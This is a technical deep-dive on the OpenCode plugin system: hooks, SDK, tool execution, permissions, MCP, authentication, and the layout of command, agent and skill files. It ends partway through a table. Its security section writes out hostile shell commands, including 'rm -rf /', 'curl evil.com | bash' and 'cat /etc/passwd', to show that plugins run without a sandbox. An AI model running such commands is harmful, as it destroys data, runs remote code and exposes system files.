# OpenCode Plugin Architecture - Comprehensive Deep Dive

This document provides an exhaustive analysis of the OpenCode plugin system, covering loading mechanisms, hook pipelines, SDK capabilities, tool execution, permissions, MCP integration, authentication, and security considerations.

---

## Table of Contents

1. [Overview](#overview)
2. [Plugin Loading Flow](#1-plugin-loading-flow)
3. [Building Plugins](#2-building-plugins)
4. [SDK Client API](#3-sdk-client-api)
5. [LLM Pipeline & Hook System](#4-llm-pipeline--hook-system)
6. [Tool Execution Lifecycle](#5-tool-execution-lifecycle)
7. [Permission System](#6-permission-system)
8. [MCP Integration](#7-mcp-integration)
9. [Session Compaction](#8-session-compaction)
10. [Authentication System](#9-authentication-system)
11. [Shell Access & Security](#10-shell-access--security)
12. [Key Files Reference](#11-key-files-reference)
13. [Plugin Boilerplate & File Structure](#12-plugin-boilerplate--file-structure)
14. [Community Plugins](#13-community-plugins)

---

## Overview

OpenCode uses a **hook-based plugin architecture** where plugins are async functions returning a `Hooks` object. This pattern is similar to Rollup/Vite plugins - lightweight, composable, and type-safe.

**Key Characteristics:**
- Plugins run **in-process** (no IPC/sandboxing)
- Full access to Bun runtime and file system
- 13 available hooks for intercepting application behavior
- Trust-based security model

---

## 1. Plugin Loading Flow

### Entry Point
**File:** `packages/opencode/src/project/bootstrap.ts:17`

```typescript
await Plugin.init()  // Called during InstanceBootstrap()
```

Plugins load at startup **before** LSP, file watchers, and other systems initialize.

### Loading Order
1. **Internal plugins** (hardcoded) - e.g., `CodexAuthPlugin`
2. **Built-in plugins** (npm packages):
   - `opencode-copilot-auth@0.0.11`
   - `opencode-anthropic-auth@0.0.8`
3. **User plugins** from config arrays (merged from all sources)

### Plugin Discovery Sources (precedence low→high)

| Source | Location |
|--------|----------|
| Remote config | `.well-known/opencode` |
| Global config | `~/.config/opencode/opencode.json` |
| Custom config | `OPENCODE_CONFIG` env var |
| Project config | `opencode.json` / `opencode.jsonc` |
| Global plugins dir | `~/.config/opencode/plugin/*.{ts,js}` |
| Project plugins dir | `.opencode/plugin/*.{ts,js}` |
| Inline config | `OPENCODE_CONFIG_CONTENT` env var |

### Plugin Loading Logic
**File:** `packages/opencode/src/plugin/index.ts:20-82`

```typescript
const state = Instance.state(async () => {
  const input: PluginInput = {
    client,           // SDK client (full API access)
    project,          // Project instance
    worktree,         // Git worktree root
    directory,        // Current directory
    serverUrl,        // Local server URL
    $: Bun.$,        // Shell utility (NO SANDBOX)
  }

  // 1. Load internal plugins
  for (const plugin of INTERNAL_PLUGINS) {
    hooks.push(await plugin(input))
  }

  // 2. Load user/builtin plugins
  for (let plugin of plugins) {
    if (!plugin.startsWith("file://")) {
      plugin = await BunProc.install(pkg, version)
    }
    const mod = await import(plugin)
    for (const [name, fn] of Object.entries(mod)) {
      hooks.push(await fn(input))
    }
  }

  return { hooks, input }
})
```

---

## 2. Building Plugins

### The Plugin Type
**File:** `packages/plugin/src/index.ts:35`

```typescript
export type Plugin = (input: PluginInput) => Promise<Hooks>
```

### Plugin Input
**File:** `packages/plugin/src/index.ts:26-33`

```typescript
export type PluginInput = {
  client: ReturnType<typeof createOpencodeClient>  // Full SDK client
  project: Project                                  // Current project info
  directory: string                                 // Working directory
  worktree: string                                  // Git worktree root
  serverUrl: URL                                    // Local server URL
  $: BunShell                                       // Shell execution (unrestricted)
}
```

### Complete Hooks Interface
**File:** `packages/plugin/src/index.ts:148-218`

| Hook | Purpose | Input | Output (mutable) |
|------|---------|-------|------------------|
| `event` | Subscribe to all bus events | `{ event: Event }` | `void` |
| `config` | React to configuration loading | `Config` | `void` |
| `tool` | Register custom tools | - | `Record<string, ToolDefinition>` |
| `auth` | Provide authentication methods | - | `AuthHook` |
| `chat.message` | Intercept new messages | `{sessionID, agent, model, messageID, variant}` | `{message, parts}` |
| `chat.params` | Modify LLM parameters | `{sessionID, agent, model, provider, message}` | `{temperature, topP, topK, options}` |
| `permission.ask` | Handle permission requests | `Permission.Info` | `{status: "ask"\|"deny"\|"allow"}` |
| `tool.execute.before` | Pre-tool execution | `{tool, sessionID, callID}` | `{args}` |
| `tool.execute.after` | Post-tool execution | `{tool, sessionID, callID}` | `{title, output, metadata}` |
| `experimental.chat.messages.transform` | Transform message history | `{}` | `{messages: [{info, parts}]}` |
| `experimental.chat.system.transform` | Modify system prompts | `{sessionID: string}` | `{system: string[]}` ← MUTABLE |
| `experimental.session.compacting` | Customize compaction | `{sessionID}` | `{context: string[], prompt?: string}` |
| `experimental.text.complete` | Post-process generated text | `{sessionID, messageID, partID}` | `{text}` |

### Minimal Plugin Example

```typescript
import { Plugin } from "@opencode-ai/plugin"
import { tool } from "@opencode-ai/plugin/tool"

export const MyPlugin: Plugin = async (ctx) => {
  return {
    tool: {
      greet: tool({
        description: "Greet someone",
        args: {
          name: tool.schema.string().describe("Name to greet"),
        },
        async execute(args) {
          return `Hello, ${args.name}!`
        },
      }),
    },
  }
}
```

---

## 3. SDK Client API

Plugins receive a full-featured `OpencodeClient` with 20+ API domains.

**File:** `packages/sdk/js/src/gen/sdk.gen.ts:1157-1197`

### Available API Domains

| Domain | Key Methods | Purpose |
|--------|-------------|---------|
| `session` | `create`, `get`, `prompt`, `fork`, `abort`, `share`, `messages` | Session management |
| `file` | `list`, `read`, `status` | File operations |
| `find` | `text`, `files`, `symbols` | Code search |
| `auth` | `set`, `remove`, `start`, `callback`, `authenticate` | Authentication |
| `config` | `get`, `update`, `providers` | Configuration |
| `tool` | `ids`, `list` | Tool registry |
| `mcp` | `status`, `add`, `connect`, `disconnect` | MCP servers |
| `tui` | `appendPrompt`, `submitPrompt`, `showToast`, `executeCommand` | UI control |
| `event` | `subscribe` | SSE event stream |
| `provider` | `list`, `models` | Provider info |
| `pty` | `create`, `resize`, `write`, `read` | PTY sessions |
| `app` | `log`, `agents` | Application logging |

### Session API Example

```typescript
// Create a new session
const session = await ctx.client.session.create({ body: { title: "My Session" } })

// Send a prompt
await ctx.client.session.prompt({
  path: { id: session.id },
  body: { content: "Hello!" }
})

// Fork at a specific message
await ctx.client.session.fork({
  path: { id: session.id },
  body: { messageID: "msg_123" }
})
```

### TUI Control Example

```typescript
// Show a toast notification
await ctx.client.tui.showToast({
  body: { message: "Plugin loaded!", type: "success" }
})

// Append text to the prompt
await ctx.client.tui.appendPrompt({
  body: { text: "/command " }
})
```

---

## 4. LLM Pipeline & Hook System

### Complete Data Flow

```
USER INPUT
    │
    ▼
┌───────────────────────────────────────────────────────┐
│ [1] chat.message hook                                 │
│     File: session/prompt.ts:1147-1160                 │
│     Purpose: Modify message content and parts         │
│     Input: {sessionID, agent, model, messageID}       │
│     Output: {message, parts} ← MUTABLE                │
└───────────────────────────────────────────────────────┘
    │
    ▼
┌───────────────────────────────────────────────────────┐
│ [2] experimental.chat.messages.transform hook         │
│     File: session/prompt.ts:589                       │
│     Purpose: Transform full conversation history      │
│     Input: {}                                         │
│     Output: {messages: WithParts[]} ← MUTABLE         │
└───────────────────────────────────────────────────────┘
    │
    ▼
┌───────────────────────────────────────────────────────┐
│ [3] experimental.chat.system.transform hook           │
│     File: session/llm.ts:76                           │
│     Purpose: Modify system prompt array               │
│     Input: {sessionID: string}                        │
│     Output: {system: string[]} ← MUTABLE              │
└───────────────────────────────────────────────────────┘
    │
    ▼
┌───────────────────────────────────────────────────────┐
│ [4] chat.params hook                                  │
│     File: session/llm.ts:107-124                      │
│     Purpose: Modify LLM call parameters               │
│     Input: {sessionID, agent, model, provider, msg}   │
│     Output: {temperature, topP, topK, options}        │
└───────────────────────────────────────────────────────┘
    │
    ▼
    LLM API CALL (streamText)
    │
    ▼
┌───────────────────────────────────────────────────────┐
│ [5] experimental.text.complete hook                   │
│     File: session/processor.ts:308-316                │
│     Purpose: Post-process generated text              │
│     Input: {sessionID, messageID, partID}             │
│     Output: {text} ← MUTABLE                          │
└───────────────────────────────────────────────────────┘
    │
    ▼
FINAL OUTPUT
```

### Hook Trigger Implementation
**File:** `packages/opencode/src/plugin/index.ts:84-99`

```typescript
export async function trigger<Name extends keyof Hooks>(
  name: Name,
  input: Input,
  output: Output
): Promise<Output> {
  for (const hook of await state().then((x) => x.hooks)) {
    const fn = hook[name]
    if (!fn) continue
    await fn(input, output)  // Hooks MUTATE output in-place
  }
  return output
}
```

**Key Pattern:** Multiple plugins chain their modifications on the same output object.

### Available Bus Events

| Category | Events |
|----------|--------|
| **Session** | `session.created`, `session.updated`, `session.error`, `session.idle`, `session.compacted`, `session.deleted`, `session.diff`, `session.status` |
| **Message** | `message.updated`, `message.part.updated`, `message.part.removed`, `message.removed` |
| **Tool** | `tool.execute.before`, `tool.execute.after` |
| **Permission** | `permission.updated`, `permission.replied` |
| **File** | `file.edited`, `file.watcher.updated` |
| **LSP** | `lsp.client.diagnostics`, `lsp.updated` |
| **MCP** | `mcp.tools.changed` |
| **Server** | `server.connected`, `server.instance.disposed` |
| **TUI** | `tui.prompt.append`, `tui.command.execute`, `tui.toast.show` |

---

## 5. Tool Execution Lifecycle

### Registration Flow
**File:** `packages/opencode/src/tool/registry.ts:32-78`

```
ToolRegistry.state()
    │
    ├─ Load from .opencode/tool/*.{ts,js}
    │
    ├─ Load from Plugin.list() → plugin.tool
    │
    └─ Built-in tools (Bash, Read, Edit, Write, etc.)
```

### Execution Flow

```
LLM selects tool
    │
    ▼
┌───────────────────────────────────────────────────────┐
│ Plugin.trigger("tool.execute.before")                 │
│ File: session/prompt.ts:694-704                       │
│ Input: {tool, sessionID, callID}                      │
│ Output: {args} ← Can modify arguments                 │
└───────────────────────────────────────────────────────┘
    │
    ▼
┌───────────────────────────────────────────────────────┐
│ tool.execute(args, context)                           │
│ Context provides: sessionID, messageID, agent, abort  │
└───────────────────────────────────────────────────────┘
    │
    ▼
┌───────────────────────────────────────────────────────┐
│ Plugin.trigger("tool.execute.after")                  │
│ File: session/prompt.ts:707-714                       │
│ Input: {tool, sessionID, callID}                      │
│ Output: {title, output, metadata} ← Can modify result │
└───────────────────────────────────────────────────────┘
    │
    ▼
Output returned to LLM
```

### ToolContext Interface
**File:** `packages/opencode/src/tool/tool.ts:16-25`

```typescript
export type Context = {
  sessionID: string
  messageID: string
  agent: string
  abort: AbortSignal
  callID?: string
  extra?: Record<string, any>
  metadata(input: { title?: string; metadata?: any }): void
  ask(input: PermissionRequest): Promise<void>  // Request permission
}
```

### Plugin vs Built-in Tools

| Aspect | Built-in Tools | Plugin Tools |
|--------|----------------|--------------|
| Definition | `Tool.define()` | `tool()` from SDK |
| Registration | Hardcoded in registry | Auto-loaded from hooks |
| Validation | Built-in Zod | Via `Tool.define` wrapper |
| Truncation | Automatic | Via `Truncate.output()` |

---

## 6. Permission System

### Permission Flow
**File:** `packages/opencode/src/permission/index.ts:100-153`

```
Tool calls ctx.ask()
    │
    ▼
Check if already approved (session cache)
    │
    ▼
┌───────────────────────────────────────────────────────┐
│ Plugin.trigger("permission.ask", info, {status:"ask"})│
│                                                       │
│ Plugin can set:                                       │
│   output.status = "allow"  → Auto-approve             │
│   output.status = "deny"   → Auto-reject              │
│   output.status = "ask"    → Prompt user              │
└───────────────────────────────────────────────────────┘
    │
    ▼
If "ask" → Wait for user response
```

### Permission Info Structure

```typescript
export type Info = {
  id: string
  type: string              // "read", "edit", "bash", etc.
  pattern?: string | string[]  // Wildcard patterns
  sessionID: string
  messageID: string
  callID?: string
  message: string           // Human-readable description
  metadata: Record<string, any>
  time: { created: number }
}
```

### Auto-Allow/Deny Example

```typescript
"permission.ask"?: async (info, output) => {
  // Auto-allow reads from safe directories
  if (info.type === "read" && info.pattern?.includes("/safe/")) {
    output.status = "allow"
    return
  }

  // Auto-deny dangerous bash commands
  if (info.type === "bash" && info.metadata?.command?.includes("rm -rf")) {
    output.status = "deny"
    return
  }

  // Otherwise, ask the user
  // (default behavior when status remains "ask")
}
```

### Permission Configuration

```json
{
  "permission": {
    "read": "ask",
    "edit": "deny",
    "bash": {
      "echo *": "allow",
      "git *": "allow",
      "*": "ask"
    }
  }
}
```

---

## 7. MCP Integration

### Overview
MCP (Model Context Protocol) tools are **merged** with plugin tools at runtime.

**File:** `packages/opencode/src/mcp/index.ts`

### Tool Integration
**File:** `packages/opencode/src/session/prompt.ts:726-799`

```typescript
// MCP tools go through same hook pipeline
for (const [key, item] of Object.entries(await MCP.tools())) {
  // Wrap with plugin hooks
  item.execute = async (args, opts) => {
    await Plugin.trigger("tool.execute.before", ...)
    const result = await originalExecute(args, opts)
    await Plugin.trigger("tool.execute.after", ...)
    return result
  }
  tools[key] = item
}
```

### MCP Server Configuration

```json
{
  "mcp": {
    "my-server": {
      "type": "local",
      "command": ["npx", "my-mcp-server"],
      "environment": { "API_KEY": "..." }
    },
    "remote-server": {
      "type": "remote",
      "url": "https://mcp.example.com",
      "oauth": { "clientId": "...", "scopes": ["read"] }
    }
  }
}
```

### MCP Events

```typescript
// Listen for MCP tool changes
return {
  event: async ({ event }) => {
    if (event.type === "mcp.tools.changed") {
      console.log(`MCP server ${event.properties.server} tools changed`)
    }
  }
}
```

### Plugin MCP Control via SDK

```typescript
// Add MCP server dynamically
await ctx.client.mcp.add({
  body: {
    name: "my-server",
    config: { type: "local", command: ["..."] }
  }
})

// Connect/disconnect
await ctx.client.mcp.connect({ path: { name: "my-server" } })
await ctx.client.mcp.disconnect({ path: { name: "my-server" } })
```

---

## 8. Session Compaction

### What is Compaction?
When context window fills up, OpenCode:
1. Summarizes conversation history via LLM
2. Prunes old tool outputs to reclaim tokens
3. Continues with preserved context

### Trigger Condition
**File:** `packages/opencode/src/session/compaction.ts:30-39`

```typescript
export async function isOverflow(input: { tokens, model }) {
  const context = input.model.limit.context
  const count = tokens.input + tokens.cache.read + tokens.output
  const usable = context - output_limit
  return count > usable
}
```

### Plugin Hook
**File:** `packages/opencode/src/session/compaction.ts:136-140`

```typescript
const compacting = await Plugin.trigger(
  "experimental.session.compacting",
  { sessionID: input.sessionID },
  { context: [], prompt: undefined },
)
```

### Plugin Customization Example

```typescript
"experimental.session.compacting"?: async (input, output) => {
  // Add project context for better summaries
  output.context.push("Project: Ring Finance")
  output.context.push("Architecture: Hexagonal/Clean Architecture")
  output.context.push("Key patterns: Repository, UseCase, Domain Events")

  // Or completely override the prompt
  output.prompt = `
    Summarize our conversation focusing on:
    1. Technical decisions made
    2. Files modified
    3. Current task status
    4. Next steps planned
  `
}
```

### Compaction Configuration

```json
{
  "compaction": {
    "auto": true,    // Enable automatic compaction (default)
    "prune": true    // Enable pruning old tool outputs (default)
  }
}
```

### Pruning Logic
**File:** `packages/opencode/src/session/compaction.ts:49-90`

- `PRUNE_MINIMUM = 20,000` - Don't prune unless saving 20k+ tokens
- `PRUNE_PROTECT = 40,000` - Keep 40k tokens of recent tool outputs
- `PRUNE_PROTECTED_TOOLS = ["skill"]` - Never prune skill outputs

---

## 9. Authentication System

### Auth Flow Overview

```
Plugin.auth.methods[]
    │
    ▼
User selects method (OAuth or API)
    │
    ├─ OAuth: Browser flow → callback → tokens
    │
    └─ API: User enters key → stored directly
    │
    ▼
Auth.set(provider, tokens)
    │
    ▼
~/.opencode/auth.json (0600 permissions)
    │
    ▼
Provider init calls plugin.auth.loader()
    │
    ▼
Custom fetch with token injection
```

### AuthHook Interface
**File:** `packages/plugin/src/index.ts:37-103`

```typescript
export type AuthHook = {
  provider: string
  loader?: (
    auth: () => Promise<Auth>,
    provider: Provider
  ) => Promise<Record<string, any>>
  methods: Array<OAuthMethod | ApiMethod>
}

type OAuthMethod = {
  type: "oauth"
  label: string
  prompts?: Array<TextPrompt | SelectPrompt>
  authorize(inputs?: Record<string, string>): Promise<AuthOauthResult>
}

type ApiMethod = {
  type: "api"
  label: string
  prompts?: Array<TextPrompt | SelectPrompt>
  authorize?(inputs?: Record<string, string>): Promise<{type: "success", key: string}>
}
```

### Token Refresh in Loader
**File:** `packages/opencode/src/plugin/codex.ts:420-443`

```typescript
loader: async (getAuth, provider) => {
  return {
    apiKey: "dummy",  // Replaced by custom fetch
    async fetch(requestInput, init) {
      const auth = await getAuth()

      // Check expiry and refresh if needed
      if (auth.expires < Date.now()) {
        const tokens = await refreshAccessToken(auth.refresh)
        await ctx.client.auth.set({
          path: { id: provider },
          body: { type: "oauth", ...tokens }
        })
      }

      // Inject auth header
      const headers = new Headers(init?.headers)
      headers.set("Authorization", `Bearer ${auth.access}`)

      return fetch(requestInput, { ...init, headers })
    }
  }
}
```

### Token Storage
**File:** `packages/opencode/src/auth/index.ts`

```typescript
// Storage location
~/.opencode/auth.json

// Schema
{
  "openai": { "type": "api", "key": "sk-..." },
  "github-copilot": {
    "type": "oauth",
    "refresh": "...",
    "access": "...",
    "expires": 1234567890,
    "accountId": "..."
  }
}
```

---

## 10. Shell Access & Security

### BunShell Exposure
**File:** `packages/opencode/src/plugin/index.ts:34`

```typescript
const input: PluginInput = {
  // ...
  $: Bun.$,  // RAW Bun shell - NO SANDBOX
}
```

### No Restrictions

Plugins receive **raw Bun.$** with zero sandboxing:

```typescript
// Full system access - nothing prevents this
await $`rm -rf /`
await $`curl evil.com | bash`
await $`cat /etc/passwd`
```

### Security Model

| Aspect | Status | Details |
|--------|--------|---------|
| **Code Review** | ❌ None | Plugins loaded without inspection |
| **Shell Restriction** | ❌ None | Can run any command |
| **File System** | ❌ Unrestricted | Read/write anywhere |
| **Network** | ❌ Unrestricted | Any network access |
| **Sandboxing** | ❌ None | Same process as server |
| **Trust Model** | ⚠️ Plugin Trust | Assumes plugins are trusted |

### Permission System Limitation

The permission system (`permission.ask`) only applies to:
- Built-in tools (bash, read, edit, etc.)
- MCP tools

**It does NOT apply to:**
- Direct `$` shell calls from plugins
- SDK client operations
- Direct file system access

### Recommendations

1. **Only install trusted plugins** from known sources
2. **Review plugin code** before installation
3. **Use local file plugins** (`.opencode/plugin/`) for custom code
4. **Monitor plugin behavior** via event hooks

---

## 11. Key Files Reference

### Core Plugin System

| File | Purpose | Key Lines |
|------|---------|-----------|
| `packages/plugin/src/index.ts` | Plugin types & hooks | 26-218 |
| `packages/opencode/src/plugin/index.ts` | Plugin loader & trigger | 20-120 |
| `packages/plugin/src/tool.ts` | Tool definition helper | 1-19 |
| `packages/plugin/src/shell.ts` | BunShell type definitions | 1-136 |

### Session & LLM

| File | Purpose | Key Lines |
|------|---------|-----------|
| `packages/opencode/src/session/prompt.ts` | Message processing & hooks | 150-1171 |
| `packages/opencode/src/session/llm.ts` | LLM streaming & params | 46-224 |
| `packages/opencode/src/session/processor.ts` | Response processing | 45-402 |
| `packages/opencode/src/session/compaction.ts` | Session compaction | 1-225 |

### Tools & Permissions

| File | Purpose | Key Lines |
|------|---------|-----------|
| `packages/opencode/src/tool/registry.ts` | Tool registration | 32-114 |
| `packages/opencode/src/tool/tool.ts` | Tool types & context | 7-83 |
| `packages/opencode/src/permission/index.ts` | Permission system | 22-209 |
| `packages/opencode/src/permission/next.ts` | Next-gen permissions | 56-241 |

### SDK & Auth

| File | Purpose | Key Lines |
|------|---------|-----------|
| `packages/sdk/js/src/gen/sdk.gen.ts` | Generated SDK client | 1157-1197 |
| `packages/sdk/js/src/gen/types.gen.ts` | Generated types | 1-3896 |
| `packages/opencode/src/auth/index.ts` | Token storage | 8-73 |
| `packages/opencode/src/provider/auth.ts` | Auth flow handlers | 10-143 |

### MCP & Config

| File | Purpose | Key Lines |
|------|---------|-----------|
| `packages/opencode/src/mcp/index.ts` | MCP client & tools | 1-875 |
| `packages/opencode/src/config/config.ts` | Config schema | 456-1057 |
| `packages/opencode/src/bus/index.ts` | Event bus | 41-86 |

### Examples

| File | Purpose |
|------|---------|
| `packages/plugin/src/example.ts` | Minimal plugin example |
| `packages/opencode/src/plugin/codex.ts` | Full OAuth plugin (524 lines) |

---

## Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                         OPENCODE PROCESS                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐          │
│  │  Plugin A    │    │  Plugin B    │    │  Plugin C    │          │
│  │  - hooks     │    │  - hooks     │    │  - hooks     │          │
│  │  - auth      │    │  - tools     │    │  - events    │          │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘          │
│         │                   │                   │                   │
│         └───────────────────┴───────────────────┘                   │
│                             │                                       │
│                    ┌────────▼────────┐                              │
│                    │  Plugin.trigger │ ← Calls all hooks in order   │
│                    └────────┬────────┘                              │
│                             │                                       │
│    ┌────────────────────────┼────────────────────────┐              │
│    │                        │                        │              │
│    ▼                        ▼                        ▼              │
│ ┌──────────┐          ┌──────────┐           ┌──────────┐          │
│ │   LLM    │          │ Sessions │           │  Tools   │          │
│ │ Pipeline │          │ Storage  │           │ Registry │          │
│ └──────────┘          └──────────┘           └──────────┘          │
│                                                                     │
│  ┌─────────────┐   ┌─────────────┐   ┌─────────────┐               │
│  │ SDK Client  │   │    Bus      │   │ Permission  │               │
│  │ (20+ APIs)  │   │  (Events)   │   │   System    │               │
│  └─────────────┘   └─────────────┘   └─────────────┘               │
│                                                                     │
│  ┌─────────────┐   ┌─────────────┐   ┌─────────────┐               │
│  │    MCP      │   │    Auth     │   │  BunShell   │               │
│  │ Integration │   │   System    │   │ (No Sandbox)│               │
│  └─────────────┘   └─────────────┘   └─────────────┘               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 12. Plugin Boilerplate & File Structure

### Complete .opencode Directory Structure

```
project/
├── .opencode/
│   │
│   ├── opencode.json           # Main configuration
│   │
│   ├── package.json            # Dependencies for local plugins
│   │
│   ├── plugin/                 # 🔌 PLUGINS - Custom functionality
│   │   ├── my-tool.ts          #    Tool plugin
│   │   ├── notifications.ts    #    Event handler plugin
│   │   └── auth-provider.ts    #    Auth plugin
│   │
│   ├── command/                # 📜 COMMANDS - Slash commands (/cmd)
│   │   ├── commit.md           #    /commit command
│   │   ├── review.md           #    /review command
│   │   └── deploy/
│   │       └── staging.md      #    /deploy/staging command
│   │
│   ├── agent/                  # 🤖 AGENTS - Custom AI personas
│   │   ├── docs.md             #    @docs agent
│   │   ├── reviewer.md         #    @reviewer agent
│   │   └── security/
│   │       └── audit.md        #    @security/audit agent
│   │
│   ├── skill/                  # 🎯 SKILLS - Reusable prompts
│   │   ├── tdd/
│   │   │   └── SKILL.md        #    TDD workflow skill
│   │   └── debugging/
│   │       └── SKILL.md        #    Debugging skill
│   │
│   └── tool/                   # 🔧 TOOLS - Standalone tool files
│       └── custom-tool.ts      #    Custom tool (alternative to plugin)
│
└── opencode.json               # Project-level config (alternative location)
```

### Commands (Slash Commands)

Commands are markdown files that define reusable prompts triggered via `/command-name`.

**Location:** `.opencode/command/` or `.opencode/commands/`

**File Format:** Markdown with YAML frontmatter

```markdown
<!-- .opencode/command/commit.md -->
---
description: Commit changes with conventional commit format
model: anthropic/claude-sonnet-4      # Optional: specific model
agent: build                           # Optional: specific agent
subtask: true                          # Optional: run as subtask
---

Commit the staged changes using conventional commit format.

Analyze the diff and create an appropriate commit message with:
- Type prefix (feat, fix, docs, refactor, test, chore)
- Scope in parentheses if applicable
- Brief description

Then push to the current branch.
```

**With Arguments:**

```markdown
<!-- .opencode/command/issue.md -->
---
description: Create or find GitHub issues
---

Search GitHub issues matching: $ARGUMENTS

Use the gh CLI to search and display results.
```

**Nested Commands:**

```markdown
<!-- .opencode/command/deploy/production.md -->
---
description: Deploy to production environment
agent: devops
---

Deploy the current branch to production.
Run all safety checks first.
```

Usage: `/deploy/production`

#### Command Frontmatter Reference

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `description` | string | No | Human-readable command description |
| `model` | string | No | Model override for this command |
| `agent` | string | No | Agent to use when running this command |
| `subtask` | boolean | No | Run as a subtask (default: `false`) |
| `template` | string | No* | Command template (in .md files, the body becomes the template) |

**Note:** In markdown files, the document body after frontmatter automatically becomes the `template`. The `template` field is required when defining commands in JSON configuration.

#### Template Placeholders

**Argument Placeholders:**
- `$1`, `$2`, `$3`... - Positional arguments
- `$ARGUMENTS` - All arguments as single string

**File Content Injection:**
- `@filepath` - Include contents of a file in the template

Example:
```markdown
---
description: Review a specific file
---
Review the code in @src/main.ts and provide feedback on:
- Code quality
- Potential bugs
- Performance issues
```

**Shell Command Injection:**
- `` !`command` `` - Execute shell command and inject its output

Example:
```markdown
---
description: Analyze recent changes
---
Analyze these recent changes and summarize the impact:

!`git diff HEAD~5`

Focus on breaking changes and API modifications.
```

**Combined Example:**
```markdown
---
description: Review changes in context
---
Here is the current state of @src/api/handler.ts

And here are the recent modifications:
!`git log --oneline -10 -- src/api/handler.ts`

Review these changes for consistency and correctness.
```

### Agents (AI Personas)

Agents are custom AI personas with specific system prompts, models, and permissions.

**Location:** `.opencode/agent/` or `.opencode/agents/`

**File Format:** Markdown with YAML frontmatter

```markdown
<!-- .opencode/agent/reviewer.md -->
---
description: Code review specialist
mode: primary                          # primary | subagent | all
model: anthropic/claude-sonnet-4       # Optional: model override
temperature: 0.3                       # Optional: lower = more focused
top_p: 0.9                             # Optional: nucleus sampling (0.0-1.0)
color: "#E74C3C"                       # Optional: UI color
hidden: false                          # Optional: hide from @ menu
disable: false                         # Optional: disable this agent entirely
steps: 30                              # Optional: max iterations
permission:                            # Optional: tool permissions
  read: allow
  edit: deny
  bash: ask
options:                               # Optional: provider-specific options
  reasoningEffort: "high"              # Example: OpenAI o1 reasoning effort
---

You are an expert code reviewer focused on:

1. Code quality and maintainability
2. Security vulnerabilities
3. Performance issues
4. Best practices adherence

Be thorough but constructive. Explain the "why" behind suggestions.
```

#### Agent Frontmatter Reference

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `description` | string | No | Human-readable description of the agent |
| `mode` | string | No | `primary`, `subagent`, or `all` (default: `all`) |
| `model` | string | No | Model identifier (e.g., `anthropic/claude-sonnet-4`) |
| `temperature` | number | No | Sampling temperature (0.0-2.0) |
| `top_p` | number | No | Nucleus sampling parameter (0.0-1.0), alternative to temperature |
| `color` | string | No | UI color in hex format (e.g., `#E74C3C`) |
| `hidden` | boolean | No | Hide from `@` menu (default: `false`) |
| `disable` | boolean | No | Disable/remove this agent entirely (default: `false`) |
| `steps` | number | No | Maximum iterations/tool calls |
| `prompt` | string | No | System prompt text (in .md files, the body becomes the prompt) |
| `permission` | object | No | Tool permission overrides (see below) |
| `options` | object | No | Provider-specific options (unknown fields are collected here) |
| `native` | boolean | No | Internal flag marking built-in system agents (not for user use) |
| `maxSteps` | number | No | **@deprecated** - Use `steps` instead. Legacy field for max iterations. |

**Note:** In markdown files, the document body after frontmatter automatically becomes the `prompt`. The `prompt` field can also be set explicitly in JSON configuration.

#### Permission Types

The `permission` field supports the following tool permission types:

| Permission | Description |
|------------|-------------|
| `read` | File read operations |
| `edit` | File edit operations |
| `bash` | Shell command execution |
| `glob` | File pattern matching |
| `grep` | Content search |
| `list` | Directory listing |
| `task` | Subagent spawning |
| `todowrite` | Todo list writing |
| `todoread` | Todo list reading |
| `question` | User question prompts |
| `webfetch` | Web content fetching |
| `websearch` | Web searching |
| `codesearch` | Code search operations |
| `lsp` | Language server operations |
| `doom_loop` | Infinite loop detection |
| `external_directory` | Access outside project directory |
| `skill` | Skill invocation |

Each permission can be set to:
- `"allow"` - Auto-approve without prompting
- `"deny"` - Auto-reject without prompting
- `"ask"` - Prompt user for approval (default)

**Agent Modes:**
- `primary` - Can be selected by user via `@agent-name`
- `subagent` - Only used internally by other agents
- `all` - Available in both contexts

**Nested Agents:**

```markdown
<!-- .opencode/agent/security/audit.md -->
---
description: Security audit specialist
mode: primary
color: "#9B59B6"
permission:
  bash: deny
  edit: deny
---

You are a security auditor. Analyze code for vulnerabilities.
Never execute code or make changes - only report findings.
```

Usage: `@security/audit`

**Configure via opencode.json:**

```json
{
  "agent": {
    "reviewer": {
      "description": "Code review specialist",
      "mode": "primary",
      "model": "anthropic/claude-sonnet-4",
      "temperature": 0.2,
      "top_p": 0.9,
      "color": "#E74C3C",
      "hidden": false,
      "disable": false,
      "steps": 50,
      "prompt": "You are an expert code reviewer...",
      "permission": {
        "read": "allow",
        "edit": "deny",
        "bash": "ask"
      },
      "options": {
        "reasoningEffort": "high"
      }
    },
    "build": {
      "steps": 100,
      "permission": {
        "bash": "allow",
        "edit": "allow",
        "external_directory": "deny"
      }
    },
    "disabled-agent": {
      "disable": true
    }
  },
  "default_agent": "build"
}
```

**Note on `options`:** Any unknown frontmatter fields in markdown agent files are automatically collected into the `options` object. This allows passing provider-specific parameters like `reasoningEffort` for OpenAI o1 models, custom headers, or other vendor-specific settings.

### Skills (Reusable Prompts)

Skills are reusable instruction sets that can be invoked during conversations.

**Location:** `.opencode/skill/` or `.opencode/skills/`

**File Format:** Directory with `SKILL.md` file (name must be exact)

```
.opencode/skill/
└── tdd/
    └── SKILL.md      # Required filename
```

```markdown
<!-- .opencode/skill/tdd/SKILL.md -->
---
name: tdd
description: Test-Driven Development workflow
license: MIT                           # Optional: license for the skill
compatibility: opencode                # Optional: compatibility indicator
metadata:                              # Optional: custom key-value pairs
  author: "Your Name"
  version: "1.0.0"
  category: "development"
---

# TDD Workflow

When implementing features, follow this process:

1. **RED** - Write a failing test first
   - Test should be minimal and focused
   - Run test to confirm it fails

2. **GREEN** - Write minimal code to pass
   - Only write enough code to make the test pass
   - Don't over-engineer

3. **REFACTOR** - Clean up the code
   - Remove duplication
   - Improve naming
   - Keep tests passing

Always run tests between each step.
```

#### Skill Frontmatter Reference

| Field | Type | Required | Description |
|-------|------|----------|-------------|
| `name` | string | Yes* | Skill identifier (validated by loader) |
| `description` | string | Yes* | Human-readable description (validated by loader) |
| `license` | string | No | License identifier (e.g., `MIT`, `Apache-2.0`). Not validated at runtime. |
| `compatibility` | string | No | Compatibility indicator (e.g., `opencode`). Reserved for future use. |
